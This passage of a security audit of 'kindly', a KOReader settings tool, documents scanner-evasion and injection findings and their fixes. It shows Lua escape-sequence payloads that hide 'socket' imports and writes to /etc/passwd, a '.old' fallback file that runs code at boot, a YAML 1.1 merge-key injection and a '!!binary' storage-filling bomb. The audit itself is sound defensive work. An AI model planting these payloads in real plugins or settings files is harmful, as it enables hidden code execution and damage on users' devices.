for **SENSITIVE_PATHS**. A `kosync` array bypasses the setup-import
SENSITIVE gate too (not just the SECRET filter).

**Why this lands.** Both bypass shapes require non-standard Lua
tables that KOReader wouldn't ordinarily produce — **but kindly
merges user YAML into device state via `mergeYamlIntoLua`**, and
`mergeYamlIntoLua` accepts these shapes on input. Post-merge, the
attacker's array-wrapped `userkey` sits in `settings.reader.lua` as
a table-with-integer-keys-with-string-userkey-field. KOReader's own
plugin lookup (`kosync.userkey`) misses the array shape and uses
nothing — the write is essentially a **covert channel / integrity
break** on the SENSITIVE side, but on the SECRET side the file
itself is now readable and contains plaintext credentials that
**bypass every subsequent `kindly pull`'s filter**.

So the chain is: (1) attacker lands array-wrapped or dotted-literal
SECRET via `apply`/`setup import` with no warning (gate doesn't
fire), (2) victim's future `kindly pull` does NOT filter the
smuggled credential (still bypasses `isSecretPath`), (3)
credential lands in YAML file → forum paste / bug report / git
commit. **Silent credential introduction + silent re-emission.**

**Fix (three call sites, one helper).**

1. `classify.ts:248` — recurse into arrays when the array's
   elements could satisfy `SECRET_PATHS[0]`. Simplest:
   `walk(key, value)` always descends, regardless of
   `Array.isArray(v)`; array elements inherit the parent path.
2. `classify.ts:115, 188` — same fix for `SENSITIVE_PATHS`.
3. `classify.ts:158` `classifyKey` — consult `SECRET_PATHS` for
   any key string containing `.`; split and treat as a path. Or
   normalize manifest input so `{"kosync.userkey": "…"}` rewrites
   to `{kosync: {userkey: "…"}}` at YAML-load time (single helper
   in `src/schema/yaml.ts`). Normalization is cleaner — a single
   check at parse time rather than scattering path-awareness
   through every classifier.

Folds into §8.12 (parser & shape guards): both variants are
input-shape violations that a strict-input normalizer would catch
before classify runs. Promotes §8.12 from a P2 (parser DoS
defense) to a P1 (SECRET filter integrity).

---

### GGG extension — `.old` fallback as a reliable code-drop primitive (live-verified 2026-04-24)

S49's §1 table lists `settings.reader.lua.old` as a static-confirmed
code-drop surface. GGG probe turns that row **live-verified** with
a minimal dual-file fixture:

```
settings.reader.lua      →  return nil          (forces fallback branch)
settings.reader.lua.old  →  do
                               local f = io.open("/tmp/.../marker.txt", "w")
                               f:write("EXECUTED\n"); f:close()
                            end
                            return { home_dir = "/tmp/attacker", … }
```

`luasettings.lua:31-45`:

```lua
ok, stored = pcall(dofile, new.file)
if ok and stored then new.data = stored            -- stored=nil fails this branch
else
    ok, stored = pcall(dofile, new.file..".old")   -- GGG lands here
    if ok and stored then new.data = stored
    else new.data = {} end
end
```

**Live observation** (KOReader emulator, macOS, 2026-04-24 08:20):
marker file written on boot, WARN logged as `LuaSettings: Failed
reading ./settings.reader.lua (probably corrupted)`. The WARN is the
only signal — nothing about `.old` being read, nothing about arbitrary
code executing. From the user's perspective KOReader booted fine.

**Why it matters.** Three properties make `.old` a cleaner attack than
`defaults.custom.lua` (S49) for some footprints:

1. **Already in SNAPSHOT_PATHS** (same as S49) — kindly snapshot/pull/apply
   round-trip it. Tar-based delivery is free.
2. **No legitimate reason for a `.old` file in a freshly-crafted `.kset`**
   — this is the file KOReader produces during its own atomic writes
   as a rollback sibling. A `.kset` author shipping a `.old` is
   prima facie suspect, which makes it a promising lint signal for
   hardening (see §8.7).
3. **Requires main file to be broken** (`return nil`, syntax error, or
   missing) — meaning kindly's schema validator on the **main file**
   doesn't see the payload at all. Defender scanning `settings.reader.lua`
   for dangerous keys finds nothing; payload lives in the sibling.

**Fix implications.** S49 warning ("≥5 code-drop surfaces") hardens by
extending the SENSITIVE gate / review summary to every file in
SNAPSHOT_PATHS that KOReader's frontend `dofile`s. GGG adds a concrete
test case: a hardening gate must reject any `.kset` that ships
`settings.reader.lua.old` unless the user explicitly opts in, and
must check **both** the main file and its `.old` sibling for
payload-shaped content.

---

### S82 — Scanner evaded by Lua escape sequences in string literals (MMM-probe, live-verified 2026-04-24) — **High**

W36/W37 scanner at `src/setup/luaScan.ts` matches sensitive module
names as literal bytes against the no-strings-stripped residue
(`stripCommentsOnly`, `:150-216`). The network-require check at
`:88`, ffi check at `:96`, and the fs-outside-scope absolute-path
checks at `:121`/`:127` all use `/\brequire\s*\(\s*["']socket["']/`-shape
patterns that expect **the source bytes of the module name to
appear literally inside the string quotes**.

`stripCommentsOnly`'s string-walk branch at `:185-195` emits every
source byte verbatim, including `\` + next char pairs at `:189-191`.
It **does not decode escape sequences** — `\x73` stays as four
source bytes `\`,`x`,`7`,`3` in the residue, not as the single byte
`s`. LuaJIT's string lexer decodes `\x##` hex, `\###` decimal, and
`\u{...}` unicode during `dofile`, so the runtime sees the original
module name while the scanner sees a string with no `socket`
substring in it.

**Evasion patterns all live-confirmed** against the four regexes:

```lua
require("\x73\x6f\x63\x6b\x65\x74")       -- hex escape → "socket"
require("\115\111\99\107\101\116")         -- decimal escape → "socket"
require("\u{73}\u{6f}\u{63}\u{6b}\u{65}\u{74}") -- unicode (LuaJIT 5.3+)
require("soc" .. "ket")                    -- concatenation (classic S3 shape)
require(string.char(115,111,99,107,101,116)) -- byte-table assembly (also S3)
io.open("\x2fetc\x2fpasswd", "w")          -- hex-escape absolute path
os.remove("\47etc\47important")            -- decimal-escape absolute path
```

**Impact.** Scanner is the backbone of three gates:

1. **`--strict-imports` catalog verdict.** UNCATALOGUED plugins
   under strict require zero scanner hits to import; hex/decimal
   escapes produce a clean scan → import proceeds.
2. **W34e advisory suppression.** Even under non-strict
   `--accept-plugins`, kindly emits a catalog advisory listing
   scanner findings. Escape-evaded payloads produce a silent
   advisory — reviewer sees "no sensitive imports detected".
3. **Proposed §W39 advisory extension** (planned for v0.11.2 —
   summarize scanner findings at trust-granting moment). Breaks
   before it ships: the proposed scope is exactly the escape-
   evaded patterns, so the advisory says "no network imports"
   on a plugin that calls `socket.http` via `\x73` bytes.

§W39 docstring currently lists scanner patterns as the trust
summary; MMM proves that summary is lossy. Fix must land before
or alongside W39 or W39 ships a known-false signal.

**Fix.** Extend `stripCommentsOnly` string-walk to decode escapes
in-place while walking. Pseudocode:

```ts
if (ch === "\\" && !stripStrings) {
    const esc = source[i + 1];
    // \xHH
    if (esc === "x" && hex2(source, i + 2)) {
        out += String.fromCharCode(parseInt(source.slice(i+2, i+4), 16));
        i += 4; continue;
    }
    // \DDD (1-3 decimal digits)
    if (esc >= "0" && esc <= "9") { /* decode 1-3 digits */ ... }
    // \u{HHHH}
    if (esc === "u" && source[i + 2] === "{") { /* parse until } */ ... }
    // \n, \t, \", \\, etc.
    out += escapeTable[esc] ?? esc;
    i += 2; continue;
}
```

Does NOT close:

- **Concatenation**: `"soc" .. "ket"` — scanner is lexical, not
  dataflow. Documented in §2.2 of docs/87 as an accepted limitation.
- **Byte-table assembly**: `string.char(115,...)` — same reason.

Both of those are the S3 class and the original W36/W37 docstring
calls them out explicitly. S82 is narrower: **the escape-decode
gap is not a known limitation**, it's a bug in the `stripCommentsOnly`
implementation, because the pattern-matcher above and the
string-walker below disagree on what a "literal module name in a
string" is. Fix restores the scanner to the strength W36/W37 was
designed for. Folds into §8.12 (or a new §8.19 if scanner deserves
its own subsection — current placement: §8.12 since it pairs with
the other parser/shape guards).

**Severity.** High. Only the escape-decode gap is fixable without a
dataflow rewrite, but it's the cheapest evasion (one string
literal, no AST manipulation, 20 chars vs. 60 for byte-table
assembly) and therefore the one attackers actually use.

---

### S83 — Lua f64 precision loss on integers > 2^53 (PPP-probe, live-verified 2026-04-24) — **Low**

`src/lua/reader.ts:219` parses numeric tokens via `Number(src.slice(start, this.pos))`:

```ts
const n = Number(this.src.slice(start, this.pos));
if (Number.isNaN(n)) this.fail("invalid number");
return n;
```

No `Number.isSafeInteger` check anywhere in `src/`. Integers above
`2^53 - 1` coerce to the nearest representable f64. Live-confirmed
divergences:

| Source token | JS `Number()` | Delta |
|--------------|--------------|-------|
| `9007199254740993` (2⁵³+1) | `9007199254740992` | −1 |
| `9007199254740999` (2⁵³+7) | `9007199254741000` | +1 |
| `1152921504606846976` (2⁶⁰) | `1152921504606847000` | +24 |

**Severity: Low.** Two mitigating factors:

1. No known KOReader key stores integers near 2⁵³. Survey of the
   557-key schema: largest type=integer values are timestamps
   (epoch-seconds, ~1.7×10⁹) and byte-offsets (~10⁷). None at risk.
2. LuaJIT (KOReader's runtime) defaults to f64 for all numbers
   too — so kindly's f64 coercion **matches LuaJIT's semantic** in
   the default build. Only LuaJIT configured with the `-DLJ_ARCH_NUMMODE=2`
   (int64 dual-number) does the runtime disagree.

**Impact scenario (narrow).** A future KOReader plugin stores
epoch-nanoseconds (≥ 2⁵³ past 2255) or a 64-bit content ID. Schema
accepts as `type: integer`. Kindly round-trips with silent ±1 drift.
User sees "I set this to X, kindly shows X±1, KOReader also shows
X±1" → correctness invariant looks fine end-to-end but the stored
value is not what the user wrote at the YAML level.

**Fix.** In `parseNumber`, after computing `n`, if the source token
has no decimal point / exponent AND `!Number.isSafeInteger(n)`, fail
with `integer literal exceeds f64 safe-integer range`. Zero false
positives on existing schema; provides loud-reject instead of
silent corruption if KOReader ever stores a large int. Folds into
§8.12. One-line defense-in-depth.

---

### S84 — `parseYamlSafe` does not pin YAML version; `%YAML 1.1` directive switches merge-key semantics (RRR2-probe, live-verified 2026-04-24) — **Medium**

`src/fs/yamlSafe.ts:42` calls `yamlParseRaw(src, { maxAliasCount: 100 })`.
**No `version` option passed.** The `yaml` library (`eemeli/yaml@2.8.3`)
defaults to YAML 1.2, but **honors a `%YAML 1.1` directive at the
top of the document and switches parse trees accordingly**. YAML 1.1
resolves `<<:` merge keys into siblings at parse time; YAML 1.2
treats `<<` as a literal string key.

**Two-way attacker primitive.** Attacker picks which parser kindly
uses by prepending (or omitting) the directive:

```yaml
%YAML 1.1
---
evil: &evil
  injected_key: "EVIL_VALUE"
kosync:
  <<: *evil     # under 1.1: kosync.injected_key = "EVIL_VALUE"
                # under 1.2: kosync["<<"] = {injected_key: "EVIL_VALUE"}
```

Live probe confirmed both branches against `kindly apply --file`:

- **Without directive** (default 1.2) — `<<` stored as literal key,
  `kindly pull` re-emits as `"<<"`, device sees `["<<"] = {...}`
  (inert but visible). This is the S79 bypass shape.
- **With `%YAML 1.1` directive** — `<<` resolved, kindly writes
  flattened `kosync.injected_key = "EVIL_VALUE"` to device.

**Why this matters even though 1.1 resolves into the classifier's
view.** S79's attack depends on 1.2 (default) leaving `<<` literal —
classifier walks miss the payload. Under 1.1 resolution classifier
**does** see flattened `kosync.injected_key`, and if the key name
hits SECRET_KEYS / SENSITIVE_KEYS / SECRET_PATHS the gate fires.
So why is this Medium?

**Reviewer-mental-model bypass.** kindly's trust pyramid assumes the
reviewer scanning a `.kset` YAML interprets it under **the same
parser semantics kindly does**. If the reviewer mentally parses
1.2 (because they know the `yaml` lib default and the directive
hid one scroll up in a 200-line file), but kindly actually parses
under 1.1, bytes land on device that differ from the reviewer's
mental diff:

- Reviewer sees `kosync: {<<: *evil, innocent: true}` and expects
  kindly to either reject `<<` or preserve it as literal.
- Kindly actually writes `kosync.injected_key` (fully flattened)
  to device via 1.1 path.

Version directive is **3 bytes at top of file** (`%YAML 1.1`), easy
to miss in a long YAML. Affected parse sites (three):

- `src/schema/yaml.ts:96` (`yamlToLua` via `parseYamlSafe`)
- `src/setup/unpack.ts:92` (manifest parse)
- `src/lib/importSetup.ts:67` (setup-import YAML parse)

Second, minor issue (cosmetic): `src/schema/yaml.ts:74` (writer)
emits `<<` unquoted when serializing a Lua key `"<<"`. Safe under
the default 1.2 (parses as literal) but if a downstream consumer
ever parses kindly's output under 1.1 the key flattens into siblings.
Same fix (pin version) closes both.

**Fix.** Single-line patch in `parseYamlSafe`:

```ts
return yamlParseRaw(src, {
    maxAliasCount: MAX_ALIAS_COUNT,
    version: '1.2',       // pin; ignore directive attempts to switch
});
```

Forces 1.2 semantics regardless of directive. Attacker loses the
version-picking primitive. Pairs with S79's input-shape normalizer
in §8.12: normalizer handles literal `<<` keys; version pin
ensures they're always literal. Folds into §8.12.

---

### S85 — YAML `!!binary` + typed-object tags: shape-guard gap + 22× serialization bomb (SSS-probe, live-verified 2026-04-24) — **High**

`yaml@2.8.3` produces **real JS typed instances** for standard tags,
confirmed via `parseYamlSafe`:

| Tag | JS type |
|-----|---------|
| `!!binary "<base64>"` | Node **Buffer** (extends `Uint8Array`) |
| `!!set { a: null }` | JS **Set** |
| `!!timestamp 2025-01-01T00:00:00Z` | JS **Date** |
| `!!omap [{x: 1}]` | JS **Map** |
| `!!map { ... }` | plain object |

Every shape-guard in `src/schema/classify.ts` and
`src/schema/yaml.ts` uses the same predicate shape:

```ts
v !== null && typeof v === "object" && !Array.isArray(v) && !(v instanceof Map)
```

Only **Map** is excluded; **Buffer / Set / Date** all pass. They
enter object-branches with surprising semantics.

**Two confirmed impacts.**

---

**Impact 1 — Serialization bomb (push-button DoS).**

`!!binary` produces a `Buffer`; `yamlToLua` iterates
`Object.entries(buffer)` → `[["0", byte0], ["1", byte1], …]`; writer
serializes each byte as a ~15-char Lua entry `    ["N"] = NNN,\n`.

Live-confirmed amplification factors:

| Source YAML | Buffer bytes | Lua output | Ratio |
|-------------|--------------|------------|-------|
| 6.99 MB | 5.00 MB | **156.2 MB** | **22.3×** (src YAML) / 29.8× (bytes) |

One 7 MB attacker YAML — **under the 10 MiB `parseYamlSafe` cap** —
produces 156 MB of Lua. `safeWrite` writes that to
`settings.reader.lua`, `settings.reader.lua.old`, AND
`.kindly/backups/<ts>/settings.reader.lua` = **~470 MB per
single apply**. Kindle internal storage is ~8 GiB; 20 rotated
backups × 470 MB = ~10 GB, fully fills the device.

**Reachable via:**
- `kindly apply --file attacker.yaml` (§S43 no-filter path)
- `kindly setup import attacker.kset` (manifest YAML → merge)
- `kindly restore attacker.tar.gz` (extracted settings.reader.lua)

On-device secondary impact: KOReader's boot runs `pcall(dofile,
settings.reader.lua)`. 156 MB of Lua source takes 10+ seconds to
tokenize on Kindle hardware — boot hang, possibly triggers
`.old` fallback (S49/GGG code-drop surface).

§8.15's proposed stream-counting sink is scoped to **archive
decompression** (S68/S75). This bomb path is
`YAML → yamlToLua → dumpSettingsFile → safeWrite` — **not
covered by §8.15**. New defense needed on the YAML-to-Lua
amplification path.

---

**Impact 2 — Typed-object classifier gap.**

`findSensitiveInValue` (classify.ts:183-199), `filterForYaml`
(classify.ts:248), `mergeYamlIntoLua` (yaml.ts:117-122),
`replaceYamlIntoLua` (yaml.ts:159-168) all use the same
Map-only exclusion. Buffer at a SECRET_PATH parent:

```yaml
kosync: !!binary "QVRUQUNLRVJfQllURVM="
```

- `classifyKey("kosync")` → USER (kosync in SECRET_PATHS only, not
  SECRET_KEYS) — gate looks for subkey names.
- `Object.entries(Buffer)` → `[["0", 65], ["1", 84], …]` — all
  numeric strings.
- `isSecretPath("kosync", "0")` / `"1"` / … → all false.
- Filter emits `kept.kosync = {"0": 65, "1": 84, …}`.
- Writer serializes numeric-keyed table.

**Net effect.** Bytes land on device as numeric-keyed Lua subtable.
KOReader's kosync plugin reads `kosync.userkey` → **nil** —
silent destruction of the user's login config. Same shape applies
to every SECRET_PATHS parent: `kosync.*`, `calibre_wireless.*`,
`opds.*`.

Plus the merge-side additive behavior (confirmed):
`mergeYamlIntoLua(device={kosync:{userkey:"KEEP"}}, yaml={kosync: Buffer})`
→ `merged.kosync = {0:65, 1:84, …, userkey:"KEEP"}`. User's secret
preserved but numeric-byte-pollution injected alongside. Any
KOReader iterator that does `pairs(kosync)` (rare but exists in
some plugins) now walks attacker bytes.

`changeHitsSensitive` DOES fire for SENSITIVE_KEYS top-level
matches (`extra_plugin_paths: !!binary` → gate blocks).
`findSensitiveInValue` walks for SENSITIVE_PATHS subkeys and
MISSES — confirmed live with `kosync: !!binary` returning
`hits: []`.

---

**Verified clean paths.**

- `zlibrary_password: !!binary "..."` — SECRET_KEYS top-level
  match by key name, `filterForYaml` drops. `droppedSecrets:
  ["zlibrary_password"]`. ✓
- `extra_plugin_paths: !!binary "..."` — SENSITIVE_KEYS
  top-level, `changeHitsSensitive` fires. ✓ But writer emits
  numeric-keyed table, so on-device `extra_plugin_paths`
  becomes inert (KOReader expects a comma-list string). Silent
  destruction of the key but no plugin-dir injection.
- `!!set { userkey: null }` — `Object.entries(Set)` → `[]`.
  Filter emits `{}`. No classifier miss, no bomb potential.
- Date (via explicit `!!timestamp`) — same empty-entries
  behavior. Date has no own enum props.

---

**Fix.** Two complementary changes:

1. **Reject non-plain-object values at `parseYamlSafe`.**
   `structuredClone`-equivalent check: walk the parse result,
   reject any `Buffer`/`Set`/`Date`/`Map` subtree with a typed
   error `YAML contains non-plain-object value (Buffer/Set/Date/Map); kindly accepts only scalars, maps, and sequences`.
   Alternative: pass `customTags: []` + a strict `schema` to
   `yamlParseRaw` to disable the non-failsafe tags entirely.
2. **Serialization cap in `dumpSettingsFile` / writer.** Pass
   through a counting buffer; abort at `MAX_OUTPUT_BYTES` (50 MiB
   default, matches §8.15's archive-uncompressed cap). Bombs
   caught before reaching `safeWrite` and before any `.old` /
   `backups/` write.

Folds into §8.12 (parser/shape guards) for the typed-object
reject; §8.15 scope widens from archive-only to cover the
YAML→Lua amplification path as well.

---

### S86 — Multi-document YAML rejected at parse (TTT-probe, attempted) — **clean**

`parseYamlSafe(docA + "\n---\n" + docB)` throws:
`Source contains multiple documents; please use
YAML.parseAllDocuments() at line N, column 1`. Error-path only;
no attacker primitive. `%YAML 1.1` directive + cross-doc
anchor attempts fail at the same check.

**Add to §3 confirmed defenses.** Forward-looking concern: the
error message literally names the escape hatch
(`parseAllDocuments()`). Any future kindly feature that wants
multi-doc manifests must not switch to `parseAllDocuments` without
adding classifier passes over each doc — otherwise cross-doc
anchors become a new bypass shape.

---

## 2. Bonus finding (false alarm, for the record)

Defender flagged `settings.kosync.password_md5` in the manifest as a
leaked credential. Verified: `password_md5` does not exist in the real
KOReader `kosync.koplugin`. The real credential is `kosync.userkey`,
which **is** in `SECRET_PATHS` (src/schema/classify.ts:38) and is
correctly filtered. Test fixture was an invented field name; defender
pattern-matched on the suspicious name.

Real filter verified end-to-end with a `kosync.userkey` fixture:
`filtered 2 secret(s)`, credential absent from exported manifest.
**No gap — withdrawn.**

---

## 3. Confirmed defenses (as of e8ce545)

| Attack | Defense | Status |
|--------|---------|--------|
| Plugin catalog impersonation + tampering | W32 known_hashes + W34e strict gate | Fixed today |
| Settings-only SENSITIVE keys (ota_server, extra_plugin_paths, …) | W31 SENSITIVE gate | Shipped |
| Secret keys in manifest | classify.ts SECRET_KEYS + SECRET_PATHS | Shipped, verified |
| Fat archive without explicit flag | `--accept-plugins` / `--accept-patches` gate | Shipped |
| Unobfuscated shell / network / dynamic-load | W36/W37 lexical scanner | Shipped |
| Archive path-traversal / absolute paths / symlinks (S8) | W34b: `isSafeRelativePath` + declared-or-reject + `lstatSync` symlink reject | Shipped, re-verified |
| Network-endpoint redirection (calibre_wireless_url, ota_server, http_proxy, trans_server, zlibrary_base_url, opds_servers, kosync.custom_server) (S10) | W31 SENSITIVE gate, domain=`network` | Shipped, re-verified |
| Partial shadow — extra file inside catalog-match plugin dir (S11) | `verify.ts` per-file compare → `extra` verdict → MISMATCH | Shipped, verified |
| replace-mode removals of SENSITIVE keys (S18) | W31 gate fires for removal direction too, exit 3 | Shipped, verified |
| ANSI escapes inside settings *values* (S25) | Settings-value renderer JSON-escapes C0 control chars | Shipped, verified (contrast with S7 meta-field gap) |
| Lua-writer string-escape injection (S30) | `lua/writer.ts` double-escapes embedded quotes | Shipped, verified |
| Export slug path-traversal (S31) | Slug sanitizer strips `../`, null bytes, etc. | Shipped, verified |
| Fat `.kset` declaration bomb — 50k phantom entries (S32) | Structural guard: declared ∩ archive + hash-recompute | Shipped, verified via implicit guard (no explicit ceiling) |
| Manifest hash-lie (S33) | `unpack.ts:138-144` recomputes `hashBytes(buf)` and compares | Shipped, verified |
| YAML billion-laughs (S35) | `yaml` library's default `maxAliasCount` | Shipped, parser-level |
| Newline/CR injection in settings values (S37) | `lua/writer.ts` escapes `\n`/`\r` as literal backslash-n/r | Shipped, verified |
| `kindly pull` SECRET leak (attempted) | `executePull` routes through `luaToYaml → filterForYaml` (classify.ts:228), strips all 10 SECRET_KEYS + both SECRET_PATHS before YAML gen; PullResult carries `droppedSecrets: string[]` — key names only | Shipped, verified 2026-04-23 with every secret slot populated; zero survival in YAML or JSON output |
| Compat-gate spoofing (attempted) | `checkCompat` takes `detected` from `readKoreaderVersion(mount)` + `detectDeviceFamily(mount)` — device-sourced ground truth, manifest cannot override | Shipped, verified 2026-04-23; fail-open on unknown-device is not attacker-controllable (manifest has no path to influence `detected`) |
| Log injection via manifest-controlled ANSI into history.jsonl / trace.jsonl (attempted) | `appendHistoryEntry` only receives setup_id hash + counts + paths from `importSetup.ts:740-752`; trace stores argv_hash (SHA-256[:12]) not raw argv; manifest strings never reach either writer | Shipped, verified 2026-04-23; `--label` is user-typed (self-inflicted, not attacker vector) and JSON.stringify-escaped on write |
| Attack surface in `plugin` / `watch` / `init` commands (attempted) | `plugin.ts` — read-only catalog browse; `watch.ts` — read-only tail of history.jsonl; `init.ts` — writes a hardcoded preset to cwd, no device touch; none import classify.ts because none write device state on attacker-controlled input | Shipped, verified 2026-04-23 via code audit; no attacker-controllable path/YAML/archive/fetch surface |
| YAML type-coercion bypass of SENSITIVE key-name match (F-probe, attempted) | `classify.ts` uses `Set.has(key)` on strings — YAML type tags, flow style, and homoglyphs all resolve to distinct JS string keys. F1 `"false"` (string) → Lua string → truthy in Lua and in §8.1's proposed `value !== false` check — correctly no bypass. F2 `!!bool false` flow-style → JS `false` → §8.1 gate would correctly fire. F3 Cyrillic `plugins_disаbled` → new dead key invisible to KOReader (which also does exact Lua-table lookup). Strict equality matches KOReader's own matching semantic | Shipped, verified 2026-04-23 via third-AI E/F/G probe; no normalization needed |
| Compression-bomb parity on restore path (G-probe, attempted) | `restore.ts:81` calls `assertSafeArchive(archivePath)` → `enforceSizeCaps` (archive bytes + uncompressed bytes + ratio) **before** the safety-snapshot step (:115) and **before** `extractTarGz` (:136). `extractTarGz` re-runs `enforceSizeCaps` internally (belt-and-suspenders). A bomb tar is rejected at :81, never triggering snapshot or extraction | Shipped, verified 2026-04-23 via third-AI G-probe; correct call order |
| S50/S52 primitives on `setup import --archive` path (attempted) | `setup/unpack.ts:86-88` lstat-checks manifest.yaml for symlink; `:113` rejects undeclared entries; `:127-132` lstat-checks every declared file with `isSymbolicLink()` + `!st.isFile()` → catches symlinks AND non-regular-files (FIFO/chardev/socket/block-dev). Duplicate-entry symlink-write-through tested live: BSD tar unlink-first default refuses to follow pre-existing symlink on regular-file overwrite — host file unchanged. Defense-in-depth: residual symlink still caught by post-extract lstat | Shipped, verified 2026-04-23 via code audit + live dup-entry probe; meaningfully better defended than restore/rollback — §8.7 scope does not extend here |
| `setup export` symlink-follow into packed `.kset` (attempted) | `collectPluginDirs` / `collectPatches` (`setup/files.ts:121-131`, `:85-89`) use `Dirent.isFile()` / `isDirectory()` which reports symlinks as neither — filter silently skips them. Comment at `files.ts:131`: "Symlinks and specials are intentionally skipped." A compromised mount with symlinks pointing at host files cannot transit into an exported `.kset` | Shipped, verified 2026-04-23 via code audit; producer-side smuggle-path closed |
| `safeWrite` symlink at `.old` or `.tmp` (H-probe, attempted) | `safeWrite.ts:103` rename replaces directory entry, not target (POSIX semantics); `:84` `unlinkSync` removes any planted symlink; `:85` `openSync(tmpPath, "wx")` uses `O_CREAT\|O_EXCL` which refuses to follow symlinks on both BSD and Linux. Live probe planted `<final>.old → /tmp/victim`, `<final>.tmp → /tmp/victim-tmp`; ran `kindly apply`; both victim files untouched, symlinks replaced by regular files | Shipped, verified 2026-04-23 via third-AI H-probe; no symlink-follow on either rename path |
| doctor/watch crash via pathological settings values (I-probe, attempted) | Ran `kindly doctor` against 10 MB string value, 100-level nested table, invalid UTF-8 bytes `\xfe\xff\x80`, 64 KB key name. All four completed in <1s with no crash/OOM/hang. Lua parser (`src/lua/reader.ts`) is iterative, not recursive — deep nesting doesn't blow the stack. Invalid UTF-8 passes through as raw bytes (Node/Bun strings are UTF-16 internally; parser treats as opaque). `kindly pull` on the 10 MB fixture emitted the full YAML without issue | Shipped, verified 2026-04-23 via third-AI I-probe; doctor and pull are robust to pathological input |
| `TMPDIR` hijack of `setup import` extraction stage (K-probe, attempted) | `setup/unpack.ts:139` uses Node `fs.mkdtempSync(join(tmpdir(), "kindly-unpack-"))` which creates the stage dir with mode `0700` by default on POSIX — other-UID processes cannot read, even when `TMPDIR` points at an attacker-controlled dir with mode `0777`. `:149-151` `rmSync(stage, { recursive: true, force: true })` in `finally` bounds the stage lifetime. Live probe: scaffolded `/tmp/audit-K/attacker-tmp`, built `stash-probe.kset` (988 B, 2 plugin files with "SENSITIVE_LUA_BYTES_v_VICTIM_SECRET_STASH_12345" + "VICTIM_ACCESS_TOKEN_deadbeefcafe0001"), ran a 0.01s polling watcher against `kindly-unpack-*` while executing `TMPDIR=/tmp/audit-K/attacker-tmp kindly setup import stash-probe.kset --accept-plugins`. Watcher harvested zero files — `mkdtempSync`'s 0700 prevents cross-UID read, and `rmSync` closes the window | Shipped, verified 2026-04-23 via live TMPDIR hijack probe; incidentally mitigates S53 for extraction tmpdirs only (not for `.kindly/backups/` which is the real plaintext-SECRET exposure) |
| YAML 1.1 bool coercion of `plugins_disabled.<name>: no` (other-AI N1-probe, attempted) | `yaml` library (eemeli/yaml) defaults to YAML 1.2 — `no`/`yes`/`on`/`off` parse as strings, not booleans. Live: `parsed.plugins_disabled.terminal` = string `"no"`. The §8.1-proposed falsy check (`value === false`) would correctly *skip* this hit (string `"no"` is truthy in JS). Lua writer emits as quoted `"no"`; KOReader's `plugins_disabled.terminal = "no"` is truthy → terminal stays disabled. No semantic mismatch between gate logic and KOReader's table-lookup truthiness | Shipped, verified 2026-04-23 via third-AI N1-probe; YAML 1.2 mode + strict equality check is coherent end-to-end |
| Unicode normalization bypass of SENSITIVE key-name match (other-AI N2-probe, attempted) | All 22 entries in `SENSITIVE_KEYS` (classify.ts:45-74) are pure ASCII (`/^[\x00-\x7f]+$/`). `Set.has()` uses strict byte-equal `===`. An attacker key like NFD `"café"` vs. NFC `"café"` would differ under `===`, but no ASCII SENSITIVE key has an NFD decomposition form — the mismatch is structurally impossible. KOReader's Lua does byte-equal table lookup, so gate and runtime stay aligned | Shipped, verified 2026-04-23 via third-AI N2-probe; ASCII-only SENSITIVE set makes normalization collisions unreachable |
| NUL-byte in Lua settings key name bypassing SENSITIVE/SECRET gate (V1-probe, attempted) | `src/lua/reader.ts:181` (`String.fromCharCode(n)`) passes decimal escape `\000` through to a JS string; `Object.keys()` preserves the NUL verbatim. `filterForYaml` / `classify.ts`'s `Set.has()` at lines 45-74 uses strict byte-equal `===`, so `"extra_plugin_paths\0evil"` does NOT match `"extra_plugin_paths"`. No downstream C-string truncation vector exists (all kindly is JS/Lua). yaml lib emits as `"evil\\0key"` quoted key; KOReader's Lua loader accepts NUL in string literals — key persists on device but is inert (no truncation consumer) | Shipped, verified 2026-04-24 via live probe; NUL-in-key parses cleanly but cannot collide with any existing SENSITIVE/SECRET name because byte-equal check matches KOReader's own Lua-table lookup semantic |
| Compression-bomb parity on `setup import --archive` path (other-AI U-probe, attempted) | `src/setup/unpack.ts:45` (`unpackSetup`) calls `extractTarGz({ archivePath, destRoot: stage })` at :83; `archive.ts:202` (`extractTarGz`) runs `enforceSizeCaps` at :211 **before** `spawnSync("tar", ["-xzf", …])` at :219. Default caps (100 MiB archive, 500 MiB uncompressed, 100:1 ratio) apply — `unpackSetup` does not override. The staging dir (`mkdtempSync` at :81) is empty when created, so bomb check fires before any bytes are extracted into it. `finally` at :149 cleans the staging dir even on failure | Shipped, verified 2026-04-24 via third-AI U-probe; setup import correctly mirrors restore's G-probe call order |
| `doctor --json` / `history --json` / `snapshot --json` / `setup export --json` SECRET leak (other-AI O-probe, attempted) | `doctor --json` emits `secretsPresent` as an array of key **names** only (`["kosync.userkey", "zlibrary_password"]`), never values; check-data payloads carry counts/versions/sample key names. `history --json` emits `backup_path` (kindly-generated absolute path, fs-layout exposure but not attacker-influenced) + user-typed `label` + counts, no SECRET values. `snapshot --json` emits `archivePath`/`includedPaths`/`bytesWritten`, no buffers or contents. `setup export --json` emits `droppedSecrets` as key names only — attempted grep for literal plaintext "O-SECRET-PW"/"O-SECRET-KEY" in output returned zero matches. The S48 value-leak is confined to `apply --json` + `diff --json` (which serialize `Change.prev`/`Change.next`); every other JSON emitter is clean | Shipped, verified 2026-04-23 via third-AI O-probe; S48 fix can scope to diff-renderer + apply-renderer and skip the other four emitters |
| YAML anchors/aliases in manifest bypass Zod (other-AI X-probe, attempted) | `yaml@2.8.3` pinned; `parseYamlSafe` (`src/fs/yamlSafe.ts:42`) passes `maxAliasCount: 100` and a 10 MiB cap. Billion-laughs throws before Zod runs. Zod `.parse()` deep-copies every nested level — `input.settings === validated.settings` is false, so post-validation mutation of the parsed alias-shared object cannot reach the validated copy. Prototype-pollution via YAML `__proto__:` lands as an own-key, not a prototype mutation, and Zod-strict drops it. The one residual shape-footprint: `SettingValueSchema` is non-strict `z.record`, so a `<<` merge-key literal inside a nested `settings.*` value round-trips to Lua as `["<<"] = {…}` — KOReader ignores it at runtime, inert but worth noting | Shipped, verified 2026-04-24 via two-AI X-probe; Zod breaks reference sharing, `maxAliasCount` caps the bomb, strict() rejects `<<` at manifest root. Nested `<<` shape-footprint is inert but should be mentioned in §8.11 scope if we pin parse-shape caps |
